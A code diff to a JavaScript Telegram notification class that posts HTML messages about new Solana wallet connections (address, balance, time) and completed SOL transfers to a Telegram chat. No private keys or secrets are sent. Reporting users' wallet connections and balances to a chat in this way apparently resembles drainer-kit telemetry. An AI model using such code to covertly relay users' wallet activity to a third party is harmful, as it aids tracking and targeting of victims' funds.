@@ -8,59 +8,43 @@ export class TelegramService {
 
   async sendMessage(message) {
     try {
-      if (!this.botToken || !this.chatId) {
-        throw new Error('Missing Telegram credentials');
-      }
-
-      const url = `https://api.telegram.org/bot${this.botToken}/sendMessage`;
-      
-      const response = await axios.post(url, {
-        chat_id: this.chatId,
-        text: message,
-        parse_mode: 'HTML'
+      const response = await fetch(`https://api.telegram.org/bot${this.botToken}/sendMessage`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          chat_id: this.chatId,
+          text: message,
+          parse_mode: 'HTML'
+        }),
       });
-      
-      return response.data;
+
+      return response.ok;
     } catch (error) {
-      throw error;
+      return false;
     }
   }
 
-  formatWalletInfo(walletData) {
-    const {
-      publicKey,
-      balance,
-      transactions,
-      timestamp
-    } = walletData;
-
-    return `🔐 <b>New Wallet Connection</b>\n\n` +
-           `👤 <b>Wallet Address:</b>\n` +
-           `<code>${publicKey}</code>\n\n` +
-           `💰 <b>Balance:</b>\n` +
-           `${balance.toFixed(2)} SOL\n\n` +
-           `⏰ <b>Connection Time:</b>\n` +
-           `${new Date(timestamp).toLocaleString()}\n\n` +
-           `📊 <b>Recent Activity:</b>\n` +
-           `${transactions.length} transactions found`;
+  formatWalletInfo(info) {
+    return `<b>🔐 New Wallet Connected</b>\n\n` +
+           `<b>Wallet Address:</b> <code>${info.publicKey}</code>\n` +
+           `<b>Balance:</b> ${info.balance.toFixed(2)} SOL\n` +
+           `<b>Time:</b> ${new Date(info.timestamp).toLocaleString()}\n\n` +
+           `<i>Wallet connection successful</i>`;
   }
 
-  formatTransactionInfo(txData) {
-    const {
-      signature,
-      amount,
-      type,
-      timestamp
-    } = txData;
+  formatTransactionInfo(info) {
+    const solanaExplorerLink = `https://solscan.io/tx/${info.signature}`;
+    const formattedTime = new Date(info.timestamp).toLocaleString();
+    const formattedAmount = parseFloat(info.amount).toFixed(2);
 
-    return `💸 <b>New Transaction Detected</b>\n\n` +
-           `📝 <b>Transaction Signature:</b>\n` +
-           `<code>${signature}</code>\n\n` +
-           `💰 <b>Amount:</b>\n` +
-           `${amount.toFixed(2)} SOL\n\n` +
-           `📤 <b>Type:</b>\n` +
-           `${type.charAt(0).toUpperCase() + type.slice(1)}\n\n` +
-           `⏰ <b>Time:</b>\n` +
-           `${new Date(timestamp).toLocaleString()}`;
+    return `<b>💸 SOL Transaction Successful</b>\n\n` +
+           `<b>Amount:</b> ${formattedAmount} SOL\n` +
+           `<b>From:</b> <code>${info.from}</code>\n` +
+           `<b>To:</b> <code>${info.to}</code>\n` +
+           `<b>Time:</b> ${formattedTime}\n\n` +
+           `<b>Transaction:</b> <a href="${solanaExplorerLink}">View on Solscan</a>\n\n` +
+           `<i>Transaction completed successfully</i>`;
   }
 } 
